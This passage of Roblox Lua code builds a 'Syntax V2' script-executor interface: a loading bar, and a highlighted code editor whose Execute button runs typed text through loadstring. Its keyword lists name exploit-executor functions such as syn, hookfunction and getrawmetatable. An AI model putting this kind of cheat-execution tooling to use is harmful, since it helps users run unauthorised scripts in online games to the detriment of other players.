ZhentorsUI_2.TextColor3 = Color3.fromRGB(255, 255, 255)
ZhentorsUI_2.TextSize = 28.000

Holder.Name = "Holder"
Holder.Parent = LoaderMain
Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Holder.BorderSizePixel = 0
Holder.ClipsDescendants = true
Holder.Position = UDim2.new(0.0482233502, 0, 0.485436887, 0)
Holder.Size = UDim2.new(0, 356, 0, 37)

Bar.Name = "Bar"
Bar.Parent = Holder
Bar.Active = true
Bar.BackgroundColor3 = Color3.fromRGB(34, 141, 255)
Bar.BorderSizePixel = 0
Bar.ClipsDescendants = true
Bar.Position = UDim2.new(-1.06179786, 0, -0.00104914489, 0)
Bar.Size = UDim2.new(0, 359, 0, 37)

TextLabel.Parent = LoaderMain
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.274111658, 0, 0.208737865, 0)
TextLabel.Size = UDim2.new(0, 186, 0, 37)
TextLabel.Font = Enum.Font.GothamBlack
TextLabel.Text = "Loading..."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 24.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

Main.Name = "Main"
Main.Parent = ZhentorsUI
Main.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
Main.Position = UDim2.new(0.163682863, 0, 0.217314497, 0)
Main.Size = UDim2.new(0, 489, 0, 253)
Main.Visible = false
Main.Active = true
Main.Draggable = true

UICorner.CornerRadius = UDim.new(0.0599999987, 0)
UICorner.Parent = Main

Clear.Name = "Clear"
Clear.Parent = Main
Clear.Active = false
Clear.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Clear.BorderColor3 = Color3.fromRGB(45, 45, 45)
Clear.Position = UDim2.new(0.319018424, 0, 0.901185751, 0)
Clear.Size = UDim2.new(0, 124, 0, 17)
Clear.Font = Enum.Font.SourceSans
Clear.Text = "Clear"
Clear.TextColor3 = Color3.fromRGB(0, 255, 255)
Clear.TextSize = 20.000

Execute.Name = "Execute"
Execute.Parent = Main
Execute.Active = false
Execute.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Execute.BorderColor3 = Color3.fromRGB(45, 45, 45)
Execute.Position = UDim2.new(0.0286298562, 0, 0.901185751, 0)
Execute.Size = UDim2.new(0, 124, 0, 17)
Execute.Font = Enum.Font.SourceSans
Execute.Text = "Execute"
Execute.TextColor3 = Color3.fromRGB(0, 255, 255)
Execute.TextSize = 20.000

ScrollingFrame.Parent = Main
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0122699384, 0, 0.118577018, 0)
ScrollingFrame.Size = UDim2.new(0, 483, 0, 192)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 9000, 0)
ScrollingFrame.ScrollBarThickness = 4

EditorFrame.Name = "EditorFrame"
EditorFrame.Parent = ScrollingFrame
EditorFrame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
EditorFrame.BorderColor3 = Color3.fromRGB(61, 61, 61)
EditorFrame.Position = UDim2.new(0, 0, 7.94728621e-08, 0)
EditorFrame.Size = UDim2.new(0, 483, 99999, 999)
EditorFrame.SizeConstraint = Enum.SizeConstraint.RelativeXX
EditorFrame.ZIndex = 3
EditorFrame.BottomImage = "rbxassetid://148970562"
EditorFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
EditorFrame.HorizontalScrollBarInset = Enum.ScrollBarInset.ScrollBar
EditorFrame.MidImage = "rbxassetid://148970562"
EditorFrame.ScrollBarThickness = 5
EditorFrame.TopImage = "rbxassetid://148970562"

Source.Name = "Source"
Source.Parent = EditorFrame
Source.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Source.BackgroundTransparency = 1.000
Source.Position = UDim2.new(0, 30, 0, 0)
Source.Size = UDim2.new(1, 0, 1, 0)
Source.ZIndex = 3
Source.ClearTextOnFocus = false
Source.Font = Enum.Font.Code
Source.MultiLine = true
Source.PlaceholderColor3 = Color3.fromRGB(204, 204, 204)
Source.PlaceholderText = "--Made By Zhentor"
Source.Text = ""
Source.TextColor3 = Color3.fromRGB(204, 204, 204)
Source.TextSize = 15.000
Source.TextXAlignment = Enum.TextXAlignment.Left
Source.TextYAlignment = Enum.TextYAlignment.Top

Tokens_.Name = "Tokens_"
Tokens_.Parent = Source
Tokens_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.BackgroundTransparency = 1.000
Tokens_.Size = UDim2.new(1, 0, 1, 0)
Tokens_.ZIndex = 5
Tokens_.Font = Enum.Font.Code
Tokens_.Text = ""
Tokens_.TextColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.TextSize = 15.000
Tokens_.TextXAlignment = Enum.TextXAlignment.Left
Tokens_.TextYAlignment = Enum.TextYAlignment.Top

Numbers_.Name = "Numbers_"
Numbers_.Parent = Source
Numbers_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Numbers_.BackgroundTransparency = 1.000
Numbers_.Size = UDim2.new(1, 0, 1, 0)
Numbers_.ZIndex = 4
Numbers_.Font = Enum.Font.Code
Numbers_.Text = ""
Numbers_.TextColor3 = Color3.fromRGB(255, 204, 102)
Numbers_.TextSize = 15.000
Numbers_.TextXAlignment = Enum.TextXAlignment.Left
Numbers_.TextYAlignment = Enum.TextYAlignment.Top

Keywords_.Name = "Keywords_"
Keywords_.Parent = Source
Keywords_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keywords_.BackgroundTransparency = 1.000
Keywords_.Size = UDim2.new(1, 0, 1, 0)
Keywords_.ZIndex = 5
Keywords_.Font = Enum.Font.Code
Keywords_.Text = ""
Keywords_.TextColor3 = Color3.fromRGB(242, 119, 122)
Keywords_.TextSize = 15.000
Keywords_.TextXAlignment = Enum.TextXAlignment.Left
Keywords_.TextYAlignment = Enum.TextYAlignment.Top

Globals_.Name = "Globals_"
Globals_.Parent = Source
Globals_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Globals_.BackgroundTransparency = 1.000
Globals_.Size = UDim2.new(1, 0, 1, 0)
Globals_.ZIndex = 5
Globals_.Font = Enum.Font.Code
Globals_.Text = ""
Globals_.TextColor3 = Color3.fromRGB(102, 204, 204)
Globals_.TextSize = 15.000
Globals_.TextXAlignment = Enum.TextXAlignment.Left
Globals_.TextYAlignment = Enum.TextYAlignment.Top

Strings_.Name = "Strings_"
Strings_.Parent = Source
Strings_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Strings_.BackgroundTransparency = 1.000
Strings_.Size = UDim2.new(1, 0, 1, 0)
Strings_.ZIndex = 5
Strings_.Font = Enum.Font.Code
Strings_.Text = ""
Strings_.TextColor3 = Color3.fromRGB(153, 204, 153)
Strings_.TextSize = 15.000
Strings_.TextXAlignment = Enum.TextXAlignment.Left
Strings_.TextYAlignment = Enum.TextYAlignment.Top

Comments_.Name = "Comments_"
Comments_.Parent = Source
Comments_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Comments_.BackgroundTransparency = 1.000
Comments_.Size = UDim2.new(1, 0, 1, 0)
Comments_.ZIndex = 5
Comments_.Font = Enum.Font.Code
Comments_.Text = ""
Comments_.TextColor3 = Color3.fromRGB(153, 153, 153)
Comments_.TextSize = 15.000
Comments_.TextXAlignment = Enum.TextXAlignment.Left
Comments_.TextYAlignment = Enum.TextYAlignment.Top

RemoteHighlight_.Name = "RemoteHighlight_"
RemoteHighlight_.Parent = Source
RemoteHighlight_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RemoteHighlight_.BackgroundTransparency = 1.000
RemoteHighlight_.Size = UDim2.new(1, 0, 1, 0)
RemoteHighlight_.ZIndex = 5
RemoteHighlight_.Font = Enum.Font.Code
RemoteHighlight_.Text = ""
RemoteHighlight_.TextColor3 = Color3.fromRGB(102, 153, 204)
RemoteHighlight_.TextSize = 15.000
RemoteHighlight_.TextXAlignment = Enum.TextXAlignment.Left
RemoteHighlight_.TextYAlignment = Enum.TextYAlignment.Top

Lines.Name = "Lines"
Lines.Parent = EditorFrame
Lines.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Lines.BackgroundTransparency = 1.000
Lines.Size = UDim2.new(0, 30, 1, 0)
Lines.ZIndex = 4
Lines.Font = Enum.Font.Code
Lines.Text = "1"
Lines.TextColor3 = Color3.fromRGB(255, 255, 255)
Lines.TextSize = 15.000
Lines.TextYAlignment = Enum.TextYAlignment.Top

Top_2.Name = "Top"
Top_2.Parent = Main
Top_2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Top_2.Size = UDim2.new(0, 489, 0, 30)

Syntax.Name = "Syntax"
Syntax.Parent = Top_2
Syntax.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
Syntax.BackgroundTransparency = 1.000
Syntax.BorderColor3 = Color3.fromRGB(55, 55, 55)
Syntax.BorderSizePixel = 0
Syntax.Size = UDim2.new(0, 131, 0, 24)
Syntax.Font = Enum.Font.SourceSans
Syntax.Text = "Syntax V2"
Syntax.TextColor3 = Color3.fromRGB(0, 255, 255)
Syntax.TextSize = 33.000

UICorner_2.CornerRadius = UDim.new(0, 6)
UICorner_2.Parent = Top_2

-- Scripts:

local function VGNDCBO_fake_script() -- LoaderMain.LocalScript 
	local script = Instance.new('LocalScript', LoaderMain)

	wait(1)
	
	local D = true
	
		if D == true then
		script.Parent.Holder.Bar:TweenPosition(UDim2.new(-1.062, 0,-0.001, 0),nil, nil, 0.5)
			wait(1)
		script.Parent.Holder.Bar:TweenPosition(UDim2.new(-0.708, 0,-0.001, 0),nil, nil, 0.5)
			wait(2)
		script.Parent.Holder.Bar:TweenPosition(UDim2.new(-0.34, 0,-0.001, 0),nil, nil, 0.5)
			wait(2)
		script.Parent.Holder.Bar:TweenPosition(UDim2.new(-0, 0,-0.001, 0),nil, nil, 0.5)
			wait(1)
			D = false
		else
			D = true
			script.Parent.Bar:TweenPosition(UDim2.new(),nil, nil, 0.5)  
	end
	-- tf am i doing
	
	wait(1)
	
	if script.Parent.Holder.Bar:TweenPosition(UDim2.new(-0, 0,-0.001, 0)) then
		wait(0.3)
		script.Parent.Parent.LoaderMain.Visible = false 
		script.Parent.Parent.Main.Visible = true --put gui here u want to go visivle ty to me ig
	end
	
	
end
coroutine.wrap(VGNDCBO_fake_script)()
local function JQYJPM_fake_script() -- Execute.script 
	local script = Instance.new('Script', Execute)

	script.Parent.MouseButton1Click:Connect(function()
		assert(loadstring(script.Parent.Parent.ScrollingFrame.EditorFrame.Source.Text))()
	end)
end
coroutine.wrap(JQYJPM_fake_script)()
local function HQOK_fake_script() -- ScrollingFrame.LocalScript 
	local script = Instance.new('LocalScript', ScrollingFrame)

	local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while", "is_synapse_function","is_protosmasher_caller", "execute","foreach","foreachi","insert","syn","HttpGet","HttpPost","__index","__namecall","__add","__call","__tostring","__tonumber","__div"}
	local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16","run_secure_function","create_secure_function","hookfunc","hookfunction","newcclosure","replaceclosure","islclosure","getgc","gcinfo","rconsolewarn","rconsoleprint","rconsoleinfo","rconsoleinput","rconsoleinputasync","rconsoleclear","rconsoleerr",}
	
	local src = script.Parent.EditorFrame.Source
	local lin = script.Parent.EditorFrame.Lines
	
	local Highlight = function(string, keywords)
		local K = {}
		local S = string
		local Token =
			{
			["="] = true,
			["."] = true,
			[","] = true,
			["("] = true,
			[")"] = true,
			["["] = true,
			["]"] = true,
			["{"] = true,
			["}"] = true,
			[":"] = true,
			["*"] = true,
			["/"] = true,
			["+"] = true,
			["-"] = true,
			["%"] = true,
			[";"] = true,
			["~"] = true
		}
		for i, v in pairs(keywords) do
			K[v] = true
		end
		S = S:gsub(".", function(c)
			if Token[c] ~= nil then
				return "\32"
			else
				return c
			end
		end)
		S = S:gsub("%S+", function(c)
			if K[c] ~= nil then
				return c
			else
				return (" "):rep(#c)
			end
		end)
	
		return S
	end
	
	local hTokens = function(string)
		local Token =
			{
			["="] = true,
			["."] = true,
			[","] = true,
			["("] = true,
			[")"] = true,
			["["] = true,
			["]"] = true,
			["{"] = true,
			["}"] = true,
			[":"] = true,
			["*"] = true,
			["/"] = true,
			["+"] = true,
			["-"] = true,
			["%"] = true,
			[";"] = true,
			["~"] = true
		}
		local A = ""
		local B = [[]]
		string:gsub(".", function(c)
			if Token[c] ~= nil then
				A = A .. c
			elseif c == "\n" then
				A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
			else
				A = A .. "\32"
			end
		end)
		return A
	end
	
	
	local strings = function(string)
		local highlight = ""
		local quote = false
		string:gsub(".", function(c)
			if quote == false and c == "\"" then
				quote = true
			elseif quote == true and c == "\"" then
				quote = false
			end
			if quote == false and c == "\"" then
				highlight = highlight .. "\""
			elseif c == "\n" then
				highlight = highlight .. "\n"
			elseif c == "\t" then
				highlight = highlight .. "\t"
			elseif quote == true then
				highlight = highlight .. c
			elseif quote == false then
				highlight = highlight .. "\32"
			end
		end)
	
		return highlight
	end
	
	local comments = function(string)
		local ret = ""
		string:gsub("[^\r\n]+", function(c)
			local comm = false
			local i = 0
			c:gsub(".", function(n)
				i = i + 1
				if c:sub(i, i + 1) == "--" then
					comm = true
				end
				if comm == true then
					ret = ret .. n
				else
					ret = ret .. "\32"
				end
			end)
			ret = ret
		end)
	
		return ret
	end
	
	local numbers = function(string)
		local A = ""
		string:gsub(".", function(c)
			if tonumber(c) ~= nil then
				A = A .. c
			elseif c == "\n" then
				A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
			else
				A = A .. "\32"
			end
		end)
	
		return A
	end
	
	local highlight_source = function(type)
		if type == "Text" then
			src.Text = script.Parent.EditorFrame.Source.Text:gsub("\13", "")
			src.Text = script.Parent.EditorFrame.Source.Text:gsub("\t", "      ")
			local s = src.Text
			src.Keywords_.Text = Highlight(s, lua_keywords)
			src.Globals_.Text = Highlight(s, global_env)
			src.RemoteHighlight_.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
			src.Tokens_.Text = hTokens(s)
			src.Numbers_.Text = numbers(s)
			src.Strings_.Text = strings(s)
			local lin = 1
			s:gsub("\n", function()
				lin = lin + 1
			end)
			script.Parent.EditorFrame.Lines.Text = ""
			for i = 1, lin do
				script.Parent.EditorFrame.Lines.Text = script.Parent.EditorFrame.Lines.Text .. i .. "\n"
			end
		end
	end
	
	highlight_source("Text")
	
	src.Changed:Connect(highlight_source)
end
coroutine.wrap(HQOK_fake_script)()

end)
